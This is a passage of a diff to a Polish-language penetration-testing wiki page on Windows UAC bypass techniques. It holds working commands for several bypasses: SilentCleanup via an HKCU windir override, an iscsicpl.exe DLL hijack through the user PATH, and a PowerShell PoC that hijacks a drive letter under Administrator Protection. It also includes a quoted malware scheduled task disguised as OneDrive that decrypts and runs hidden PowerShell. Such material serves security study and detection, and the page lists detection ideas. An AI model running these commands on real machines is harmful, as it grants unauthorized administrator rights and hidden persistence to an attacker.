 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
-Ta wersja nadal czyści dropper i zostawia tylko staged payloads, przez co wykrywanie opiera się na monitorowaniu **`CurVer` hijack**, manipulacji `ConsentPromptBehaviorAdmin`, tworzeniu wykluczeń Defendera albo zaplanowanych zadań, które w pamięci deszyfrują PowerShell.
+Ten wariant nadal usuwa dropper i pozostawia wyłącznie staged payloads, przez co wykrywanie wymaga monitorowania **hijack `CurVer`**, manipulowania wartością `ConsentPromptBehaviorAdmin`, tworzenia wykluczeń w Defenderze lub scheduled tasks, które deszyfrują PowerShell w pamięci.
+
+### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)
+
+`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać high integrity bez okna zgody. Ta metoda nadal jest warta testowania na nowszych buildach, ponieważ UACME utrzymuje tę technikę aktywną, a najnowsze zgłoszenia wskazują, że Windows 11 24H2 może wymagać jedynie niewielkich korekt cudzysłowów.
+```cmd
+reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
+schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+reg delete "HKCU\Environment" /v windir /f
+```
+If zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Zawsze usuń `HKCU\Environment\windir` po zakończeniu testów.
 
 #### Więcej UAC bypass
 
-**Wszystkie** techniki użyte tutaj do obejścia AUC **wymagają** **pełnej interaktywnej powłoki** z ofiarą (zwykła shell nc.exe nie wystarczy).
+Wiele klasycznych UAC bypass, które wykorzystują przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem, wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub service działający w **Session 0** często nie wystarcza.
 
-Możesz to uzyskać, używając sesji **meterpreter**. Przełącz się do **procesu**, którego wartość **Session** wynosi **1**:
+Często można rozwiązać ten problem za pomocą sesji **meterpreter**. Wykonaj migrację do **process**, którego wartość **Session** wynosi **1**:
 
-![](<../../images/image (863).png>)
+![Wskaż ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu - Więcej UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Wykonaj migrację do process, którego wartość Session...](<../../images/image (863).png>)
 
 (_explorer.exe_ powinien działać)
 
 ### UAC Bypass z GUI
 
-Jeśli masz dostęp do **GUI, po prostu możesz zaakceptować monit UAC**, gdy się pojawi, tak naprawdę nie potrzebujesz bypassu. Uzyskanie dostępu do GUI pozwoli więc obejść UAC.
+Jeśli masz dostęp do **GUI, możesz po prostu zaakceptować monit UAC**, gdy się pojawi; tak naprawdę nie potrzebujesz technicznego bypassu. Dlatego uzyskanie sesji GUI często wystarcza, aby ominąć praktyczne utrudnienia dodane przez UAC.
 
-Ponadto, jeśli dostaniesz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), są **pewne narzędzia, które będą uruchomione jako administrator**, z których możesz **uruchomić** na przykład **cmd** bezpośrednio **jako admin**, bez ponownego monitu UAC, jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). To może być trochę bardziej **stealthy**.
+Ponadto, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), **niektóre narzędzia będą uruchomione jako administrator**, dzięki czemu możesz **uruchomić** na przykład **cmd** bezpośrednio **jako admin**, bez ponownego wyświetlania monitu UAC, tak jak w przypadku [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.
 
 ### Głośny brute-force UAC bypass
 
-Jeśli nie przeszkadza ci bycie głośnym, możesz zawsze **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co **będzie prosić o podniesienie uprawnień, aż użytkownik to zaakceptuje**.
+Jeśli nie zależy Ci na zachowaniu ciszy, zawsze możesz **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co **prosi o podniesienie uprawnień, dopóki użytkownik tego nie zaakceptuje**.
 
 ### Własny bypass - podstawowa metodologia UAC bypass
 
-Jeśli spojrzysz na **UACME**, zauważysz, że **większość UAC bypassów nadużywa podatności Dll Hijacking** (głównie poprzez zapisanie złośliwego dll w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypass wykorzystuje DLL hijacking** (często poprzez sprawienie, aby podniesiony binary załadował kontrolowaną przez attackera DLL z zapisywalnej ścieżki). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Znajdź binarkę, która będzie się **autoelevate** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integrity).
+1. Znajdź binary, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
 2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
-3. Prawdopodobnie będziesz musiał **zapisać** DLL wewnątrz jakichś **protected paths** (jak C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść używając:
-1. **wusa.exe**: Windows 7,8 i 8.1. Pozwala wyekstrahować zawartość pliku CAB do protected paths (ponieważ to narzędzie jest uruchamiane z wysokiego poziomu integrity).
+3. Prawdopodobnie będziesz musieć **zapisać** DLL w niektórych **chronionych ścieżkach** (takich jak C:\Windows\System32), w których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
+1. **wusa.exe**: Windows 7,8 i 8.1. Pozwala wyodrębnić zawartość pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane z wysokiego poziomu integralności).
 2. **IFileOperation**: Windows 10.
-4. Przygotuj **skrypt**, aby skopiować DLL do protected path i uruchomić podatną oraz autoelevated binarkę.
+4. Przygotuj **script**, który skopiuje Twoją DLL do chronionej ścieżki i uruchomi podatny oraz autoelevated binary.
 
 ### Inna technika UAC bypass
 
-Polega na sprawdzeniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** binarki lub **polecenia**, które ma zostać **wykonane** (jest to ciekawsze, jeśli binarka szuka tych informacji w **HKCU**).
+Polega na sprawdzeniu, czy **autoElevated binary** próbuje **odczytać** z **registry** **nazwę/ścieżkę** **binary** lub **command**, który ma zostać **wykonany** (jest to ciekawsze, jeśli binary szuka tych informacji w **HKCU**).
 
-### UAC bypass przez `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack
+### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijack użytkownika `PATH`
 
-32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to **auto-elevated** binary, którą można nadużyć do załadowania `iscsiexe.dll` przez search order. Jeśli możesz umieścić złośliwy `iscsiexe.dll` w folderze **user-writable**, a następnie zmodyfikować bieżący `PATH` użytkownika (na przykład przez `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować DLL atakującego do procesu podniesionego `iscsicpl.exe` **bez wyświetlania monitu UAC**.
+32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to **auto-elevated** binary, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwą `iscsiexe.dll` w **folderze zapisywalnym przez użytkownika**, a następnie zmodyfikować `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować DLL attackera do podniesionego process `iscsicpl.exe` **bez wyświetlania monitu UAC**.
 
 Uwagi praktyczne:
-- To jest przydatne, gdy bieżący użytkownik należy do **Administrators**, ale działa z **Medium Integrity** z powodu UAC.
-- Kopia z **SysWOW64** jest tą właściwą dla tego bypassu. Traktuj kopię z **System32** jako osobną binarkę i zweryfikuj zachowanie niezależnie.
-- Primitiva to połączenie **auto-elevation** i **DLL search-order hijacking**, więc ten sam workflow ProcMon używany przy innych UAC bypassach jest przydatny do potwierdzenia brakującego ładowania DLL.
+- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale działa na poziomie **Medium Integrity** z powodu UAC.
+- Kopia w **SysWOW64** jest istotna dla tego bypassu. Potraktuj kopię w **System32** jako oddzielny binary i niezależnie zweryfikuj jej zachowanie.
+- Primitive jest połączeniem **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam workflow ProcMon, który jest używany w przypadku innych UAC bypass, jest przydatny do zweryfikowania brakującego ładowania DLL.
 
-Minimalny flow:
+Minimalny przebieg:
 ```cmd
 copy iscsiexe.dll %TEMP%\iscsiexe.dll
 reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
 C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
 ```
-Pomysły na detection:
-- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
-- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
-- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.
+Pomysły na wykrywanie:
+- Generuj alerty dla `reg add` / zapisów do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
+- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
+- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.
 
-### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map
+### Nowsze badania, które warto sprawdzić osobno
 
-Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.
+Niektóre łańcuchy z okresu po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Przykładowo, poisoning activation-context cache może łączyć **remapowanie dysku** i **przekierowanie DLL**, aby przejść z poziomu medium do high integrity za pośrednictwem zaufanych interfejsów użytkownika / plików binarnych z auto-elevate, takich jak `ctfmon.exe`, a następnie celów takich jak `fodhelper.exe`. Zamiast duplikować tutaj obszerny PoC, sprawdź zwarte przykłady payloadów w:
+
+{{#ref}}
+../windows-local-privilege-escalation/windows-c-payloads.md
+{{#endref}}
+
+### Hijack litery dysku w Administrator Protection (25H2) za pośrednictwem mapy urządzeń DOS dla sesji logowania
+
+Pełny attack surface `RAiLaunchAdminProcess` / UIAccess w Windows 11 25H2 opisano na dedykowanej stronie:
+
+{{#ref}}
+../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
+{{#endref}}
+
+Funkcja „Administrator Protection” w Windows 11 25H2 używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` przypisanymi do sesji. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązywaniu `\??`. Jeśli attacker dokona impersonacji tokenu shadow-admin wyłącznie na poziomie **SecurityIdentification**, katalog zostanie utworzony z attackerem jako **ownerem** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie linków liter dysków mających pierwszeństwo przed `\GLOBAL??`.
 
 **Kroki:**
 
-1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
-2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
-3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.
+1. Z sesji z niskimi uprawnieniami wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony promptu proces shadow-admin `runonce.exe`.
+2. Zduplikuj jego primary token jako token typu **identification** i dokonaj jego impersonacji podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z własnością attackera.
+3. Utwórz tam symlink `C:` wskazujący na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` do ścieżki attackera, umożliwiając DLL/file hijack bez wyświetlania promptu.
 
 **PowerShell PoC (NtObjectManager):**
 ```powershell
@@ -278,14 +335,15 @@ Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | 
 $auth = Get-NtTokenId -Authentication -Token $id
 New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
 ```
-## References
-- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
-- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
+## Referencje
 - [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
-- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
-- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
-- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
-- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [UACME – Zbiór technik omijania UAC](https://github.com/hfiref0x/UACME)
+- [WinPwnage – skaner zgodności i launcher technik omijania UAC](https://github.com/rootm0s/WinPwnage)
+- [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
+- [Check Point Research – Operation TrueChaos: wykorzystanie 0-day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
+- [Project Zero – Omijanie Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [Project Zero – Omijanie Administrator Protection przez nadużycie UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
+- [Sigma / Detection.FYI – Omijanie UAC za pomocą zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
 
 {{#include ../../banners/hacktricks-training.md}}
